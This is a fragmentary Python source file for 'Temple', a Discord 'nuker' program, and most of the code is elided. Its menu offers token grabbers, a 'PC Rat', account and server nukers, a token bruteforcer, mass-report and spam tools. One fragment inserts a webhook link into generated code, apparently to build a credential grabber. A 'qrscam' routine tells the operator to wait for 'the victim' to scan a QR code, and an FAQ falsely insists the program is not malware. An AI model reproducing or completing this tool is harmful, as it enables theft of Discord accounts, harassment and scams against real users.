def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r[\x1b[31m+\x1b[95m\x1B[37m] Loading HWID... [{i}]""")
		sys.stdout.flush()
		time.sleep(0.1)
...
from time import sleep
import os
os.system("title Connecting To Discord... ")
print(f"{Fore.WHITE}")
progressbar = tqdm([2,4,6,8,9,10,11,12,13,14,15])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Connecting')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Locating Token Directory... ")
print(f"{Fore.WHITE}")
progressbar = tqdm([1,2,3])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Locating Token Directory')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Checking HWID...")
print(f"{Fore.WHITE}")
progressbar = tqdm([1,2,])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' HWID Progress')
...
print('')
print('')
print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE} ______   ______     __    __     ______   __         ______    {Fore.RESET}')
sleep(0.15)
print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE}/\__  _\ /\  ___\   /\ "-./  \   /\  == \ /\ \       /\  ___\   {Fore.RESET}')
sleep(0.15)
print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE}\/_/\ \/ \ \  __\   \ \ \-./\ \  \ \  _-/ \ \ \____  \ \  __\   {Fore.RESET}')
sleep(0.15)
print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE}   \ \_\  \ \_____\  \ \_\ \ \_\  \ \_\    \ \_____\  \ \_____\ {Fore.RESET}')
sleep(0.15)
print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE}    \/_/   \/_____/   \/_/  \/_/   \/_/     \/_____/   \/_____/ {Fore.RESET}')
sleep(1)
os.system('cls')
...
print('')
print('')
print('                                                Temple I Created By Velocity#9257')
sleep(1)
...
u = 'https://discord.com/api/v9/channels/messages'
title = 'Temple I ††#9999'
...
def spammer():
    ...
    print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE}   \ \_\  \ \_____\  \ \_\ \ \_\  \ \_\    \ \_____\  \ \_____\ {Fore.RESET}')
    print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE}    \/_/   \/_____/   \/_/  \/_/   \/_/     \/_____/   \/_____/ {Fore.RESET}')
    print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE} {Fore.RESET}')
    print(f'                                {Fore.WHITE}{Fore.RESET}{Fore.WHITE} {Fore.RESET}')
    print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}') 
    print(f'{Fore.WHITE} Features{Fore.RESET}')  
    print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}1{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Joiner          {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}9{Fore.RESET}{Fore.WHITE}]{Fore.RESET}  Spammer           {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}17{Fore.RESET}{Fore.WHITE}]{Fore.RESET} MassReport{Fore.RESET}          {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}25{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Generator{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}2{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Leaver          {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}10{Fore.RESET}{Fore.WHITE}]{Fore.RESET} DM Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}18{Fore.RESET}{Fore.WHITE}]{Fore.RESET} About/Activity{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}26{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Nitro Generator{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}3{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Checker   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}11{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Friend Spammer    {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}19{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Typing Spammer{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}27{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Advanced Token Grabber{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}4{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Onliner   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}12{Fore.RESET}{Fore.WHITE}]{Fore.RESET} HypeSquad Joiner  {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}20{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Bruteforcer{Fore.RESET}   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}28{Fore.RESET}{Fore.WHITE}]{Fore.RESET} PC Rat{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}5{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Token Grabber   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}13{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Reaction Spam     {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}21{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Status Changer{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}29{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Tools{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}6{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server MassDM   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}14{Fore.RESET}{Fore.WHITE}]{Fore.RESET} NickName Changer  {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}22{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Group Spammer{Fore.RESET}       {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}30{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Exit{Fore.RESET}')
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}7{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Account Nuker   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}15{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Webhook Spammer   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}23{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Auto Login {Fore.RESET}')        
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}8{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Server Nuker    {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}16{Fore.RESET}{Fore.WHITE}]{Fore.RESET} VC Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}24{Fore.RESET}{Fore.WHITE}]{Fore.RESET} About {Fore.RESET}')
    print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}') 
    print(f'{Fore.WHITE} Extras{Fore.RESET}') 
    print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}') 
    print(
        f'{Fore.WHITE}[{Fore.LIGHTRED_EX}A{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Help/Support   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}B{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Cheat Injector   {Fore.BLACK}|{Fore.RESET}{Fore.WHITE}[{Fore.LIGHTRED_EX}C{Fore.RESET}{Fore.WHITE}]{Fore.RESET} Feature Name {Fore.RESET}')        
    print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}')  
    ...
    if choice == '9':
        ...
        start = input(f'{Fore.WHITE}[{Fore.LIGHTRED_EX}>{Fore.WHITE}] Press Enter To Start: {Fore.RESET}')
        start = thread()
...
''' % (token))
    ...
    if choice == '19':	
        ...
        time.sleep(2)
        exit = input(f'{Fore.WHITE}[{Fore.LIGHTRED_EX}>{Fore.WHITE}] Press Enter: {Fore.RESET}')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()
...
main()""".replace("~~TOKENURLHERE~~", webhooklink))
        ...
        if choice == '\\//':
            ...
            def qrscam():
                ...
                print('{Fore.WHITE}[>]{Fore.RESET} Dont close Temple, wait for the victim to scan the QR code')
    ...
    if choice == 'A':
        ...
        os.system('cls')
        print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}') 
        print(f'{Fore.WHITE} Hello, Here are some frequently asked questions that i will answer{Fore.RESET}') 
        print(f'{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}') 
        print(f'''{Fore.WHITE} 
- FAQ:
- Q: Is This Program Malware?
- A: No, It is not you can view the code through Notepad Or Any Program That Can Read python code.
- Q: Is This Program Free?
- A: Yes, It's completely free of charge. 
- Q: Do I Have A Discord Server?
- A: No, I don't

- For More Information: Contact ††#9999 On Discord
...
{Fore.RESET}''')
    ...
    if choice == 'B':
        ...
        Spinner()
        os.system('cls')
        print(f'''{Fore.WHITE}[{Fore.LIGHTRED_EX}Sorry!{Fore.WHITE}]{Fore.WHITE} This Feature Has Not Been Completed{Fore.RESET}''')
    ...
    if choice == '24':
        ...
        Spinner()
        os.system('cls')
        print(f'''{Fore.WHITE} \n\nHey There!, just a quick message talking about Temple!
- This Nuker was created / dev by ††#9999 And Edited By Velocity#9257
- unknown person... (from the uk)
- I am very retarded
- Add Me On Facebook Sussy Amoguys Boy
{Fore.RESET}''')
